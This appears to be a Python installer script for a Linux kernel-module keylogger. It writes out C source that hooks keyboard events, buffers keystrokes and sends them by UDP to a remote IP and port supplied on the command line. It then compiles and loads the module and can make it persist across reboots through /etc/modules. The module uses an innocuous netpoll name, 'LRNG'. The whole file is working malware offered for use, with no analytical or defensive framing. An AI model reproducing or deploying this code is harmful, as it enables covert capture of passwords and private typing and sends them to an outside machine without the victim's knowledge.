#!/usr/bin/python
from commands import getoutput
import socket
import fcntl
import struct
import argparse


parser = argparse.ArgumentParser(description = "Install the linux kernel module keylogger")
parser.add_argument("-sp", help="the port of the local machine to send keystrokes out of", 
                    metavar="source-port", type=int, required=True)
parser.add_argument("-dp", help="the port of the machine to send keystrokes to", 
                    metavar="dest-port", type=int, required=True)
parser.add_argument("-da", help="the ip address of the machine to send the keystrokes to",
                    metavar="dest-address", required=True)
parser.add_argument("-a", "--auto-load", help="have the os load the keylogger automatically at boot",
                    action = "store_true")


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15]))[20:24])


def ip_addr_to_hex_str(ip):
    parts = ip.split(".")
    hex_str = "0x"
    for part in parts:
        str_part = hex(int(part)).replace("0x", "")
	if len(str_part) == 1:
		str_part = "0" + str_part
	hex_str += str_part
    return hex_str

def install_keylogger(src, permanently = False): 
    with open("keylogger.c", "w") as src_f:
        src_f.write(src)

    # TODO: check to see if these give errors and inform the user if so
    resp = getoutput("make")
    resp = getoutput("insmod ems_log.ko")
    
    if permanently:
        # now that we inserted it, permanently insert the module so it loads on boot
        print(getoutput("cp ems_log.ko /lib/modules/`uname -r`/kernel/drivers"))
        print(getoutput("echo \"ems_log\" >> /etc/modules"))
        print(getoutput("depmod"))

def generate_source(src_addr, src_port, dest_addr, dest_port):
    src = """#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/netpoll.h>
#include <asm/io.h>
#include <linux/keyboard.h>

#include "keylogger.h"

#define PROC_FILE_NAME "kl"
#define BUFFER_SIZE 32

static char kl_buffer[BUFFER_SIZE+1];
static int kl_buffer_offset = 0;
static struct file_operations proc_fops;
static struct netpoll *np = NULL;
static struct netpoll np_t;
static struct notifier_block nb;

// INADDR_LOCAL is the local ip address, since 127.0.0.1 wont work..
// you'll have to replace this with the hex of the ip for the computer you're adding this
// module to
#define INADDR_LOCAL ((unsigned long int)%s)
#define INADDR_SEND ((unsigned long int)%s)

static void send_msg(char *msg, size_t size)
{
                if(kl_buffer[0] != '\0') {
                        netpoll_send_udp(np, msg, size);
                }
}

/*
 This function services keyboard interrupts.
*/
static void reset_buffer(void)
{
        send_msg(kl_buffer, kl_buffer_offset);
        kl_buffer_offset = 0;
        memset(kl_buffer, 0, BUFFER_SIZE);
}


static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) 
{
        int read_size;
        if(count > BUFFER_SIZE) {
                read_size = BUFFER_SIZE;
        } else {
                read_size = count;
        }

        copy_to_user(buf, kl_buffer, read_size);
        reset_buffer();
        return read_size;
}

static void setup_netpoll(void)
{
        np_t.name = "LRNG";
        strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
        np_t.local_ip.ip = htonl(INADDR_LOCAL);
        np_t.remote_ip.ip = htonl(INADDR_SEND);
        np_t.local_port = %d;
        np_t.remote_port = %d;
        memset(np_t.remote_mac, 0xff, ETH_ALEN);
        netpoll_setup(&np_t);
        np = &np_t;
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
        struct keyboard_notifier_param *param = _param;
        int scancode;
        int reslt;
        char c;
                          
        if (code == KBD_KEYCODE) {
                scancode = param->value;
                if(!param->down) {
                        scancode += 0x80;
                }

                reslt = handle_scancode(scancode, &c);
                if(reslt == NEW_CHAR) {
                        if(kl_buffer_offset >= BUFFER_SIZE) {
                                reset_buffer();
                        }
                        kl_buffer[kl_buffer_offset++] = c;
                }
        }
        return 0;
}

/*
 Initialize the module - register the IRQ handler
*/
static int __init init_keylogger(void)
{
        proc_fops.read = read_simple;
        nb.notifier_call = hello_notify;
        register_keyboard_notifier(&nb);
        setup_netpoll();
        return 0;
}

static void __exit exit_keylogger(void)
{
        unregister_keyboard_notifier(&nb);
}

module_init(init_keylogger);
module_exit(exit_keylogger);
MODULE_LICENSE ("GPL");""" % (src_addr, dest_addr, src_port, dest_port)
    return src

def main():
    args = parser.parse_args()
    local_ip = ip_addr_to_hex_str(get_ip_address("eth0"))
    dest_ip = ip_addr_to_hex_str(args.da)
    src_port = args.sp
    dest_port = args.dp
    perm = bool(args.auto_load)
    src = generate_source(local_ip, src_port, dest_ip, dest_port)
    install_keylogger(src, perm)

if __name__ == "__main__":
    main()



































